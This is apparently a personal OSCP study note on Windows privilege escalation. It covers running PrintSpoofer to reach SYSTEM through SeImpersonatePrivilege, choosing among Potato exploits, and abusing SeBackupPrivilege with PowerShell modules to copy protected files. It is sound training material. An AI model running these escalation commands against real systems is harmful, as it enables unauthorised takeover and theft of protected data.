---
aliases:
  - Exploits
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - windows
  - privesc
  - privilege_escalation
  - exploit
author: Mehdi N Tehrani
creat_date: 2024-01-02
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# PrintSpoofer
#printspoofer #print_spoofer 
[Print Spoofer](https://github.com/itm4n/PrintSpoofer)

User running it on Windows requires `SeImpersonatePrivilege`
#seimpersonateprivilege #se_impersonate_privilege 

```cmd
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeSecurityPrivilege           Manage auditing and security log          Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```
Command Syntax:
#syntax
```
printspoofer64.exe -i -c powershell.exe

C:\Windows\System32> whoami
nt authority\system
```

# Potatoes
#potatoes #sweet_potato #juicy_potato #rogue_potato
[Potatoes GitLab](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
[Potatoes GitHub](https://github.com/foxglovesec/Potato)


- Use [Sweet Potato Download](https://github.com/CCob/SweetPotato) to rule them all
- If you do not want to use Sweet Potato:
    - If the machine is >= Windows 10 1809 & Windows Server 2019 - Try [Rogue Potato](https://github.com/antonioCoco/RoguePotato)
    - If the machine is < Windows 10 1809 < Windows Server 2019 - Try *Juicy Potato*


# Backup privileges
#SeBackupPrivilege #SeRestorePrivilege #se_backup_privilege #copy_file_se_backup_privilege

```
Privilege Name                Description                               State   
============================= ========================================= ========
SeBackupPrivilege             Back up files and directories             Disabled
SeRestorePrivilege            Restore files and directories             Disabled
...
```
## process
[HatTricks Article](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators-1)
### 1. Download Powershell modules
[SeBackupPrivilegeCmdLets.dll Download](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
[SeBackupPrivilegeUtils.dll Download](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)

### 2. Import Modules
```powerhshell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
### 3. Set SeBackupPrivilege
```
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
### 4. Copy files user don't have access to
```
Copy-FileSeBackupPrivilege <source_path> <destination_path>
```
